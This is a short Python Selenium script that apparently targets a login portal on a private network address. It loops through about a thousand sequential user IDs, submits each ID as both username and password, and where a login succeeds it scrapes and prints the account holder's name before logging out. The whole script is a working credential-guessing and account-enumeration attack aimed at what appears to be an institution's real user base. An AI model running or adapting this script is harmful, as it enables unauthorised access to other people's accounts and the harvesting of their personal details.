from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException




driver = webdriver.Chrome('/home/rgukt/chromedriver')

driver.get('http://10.50.50.4:8080/')

driver.set_page_load_timeout(2)

#userid
#password
#auth > input.submit

id="hai"
string="def"
for  i in range(141001,141999):
	try:
			if(i==141001):
				string="first"
			id="R"+str(i)
			driver.find_element_by_css_selector('#userid').send_keys(id)
			driver.find_element_by_css_selector('#password').send_keys(id)
			driver.find_element_by_css_selector('#auth > fieldset > fieldset > input').click()
	except TimeoutException as ex:
				string=driver.find_element_by_css_selector('#members > ul > li:nth-child(1) > span > a > span').text
				print(string+"-"+id)
				driver.find_element_by_css_selector('#members > ul > li:nth-child(2)').click()
